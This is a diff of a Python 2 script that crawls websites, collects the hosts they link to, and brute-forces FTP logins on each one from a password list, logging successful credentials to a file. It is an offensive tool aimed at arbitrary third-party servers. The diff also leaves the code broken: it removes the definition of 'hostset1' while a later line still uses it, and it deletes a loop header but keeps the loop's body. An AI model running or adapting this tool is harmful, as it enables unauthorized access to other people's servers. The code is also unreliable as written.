@@ -13,7 +13,6 @@ passwdFile = 'userpass.txt'
 hosts = queue.Queue()
 hostpool=queue.Queue()
 hostset=set()
-hostset1=set()
 hostpool.put("http://www.qkankan.com/")
 hostset1.add("http://www.qkankan.com/")
 def bruteLogin(dic):
@@ -33,7 +32,7 @@ def bruteLogin(dic):
                     ftp = ftplib.FTP(hostname)
                     ftp.login(userName, passWord)
                     print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
-                    succ=open('succ.txt','w+')
+                    succ=open('succ.txt','a')
                     succ.write('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord)
                     succ.close()
                     ftp.quit()
@@ -57,10 +56,6 @@ def scanhost():
                 #use re.findall to get all the links
                 links = re.findall('"((http|ftp)?://(.*?(\.net|\.com|\.cn|\.org|\.cc|\.tv|\.tk|\.me|\.edu|\.uk|\.jp|\.info|\.nl|\.tw|\.cf|\.ga|\.ly|\.hk|\.us|\.xyz|\.aisa|\.top|\.gq|\.ml)).*?)"', html,re.I)
 
-                for link in links:
-                    if link[0] not in hostset1:
-                        hostpool.put(link[0])
-                        hostset1.add(link[0])
 
                     if link[2] not in hostset:
                         try: 
@@ -69,6 +64,7 @@ def scanhost():
                             print 'gethost:'+link[2]+str(e)
                         hosts.put(ip)
                         hostset.add(link[2])
+                        hostpool.put(link[2])
         except Exception,e:
             #print 'urlopen:'+host+str(e)
             pass
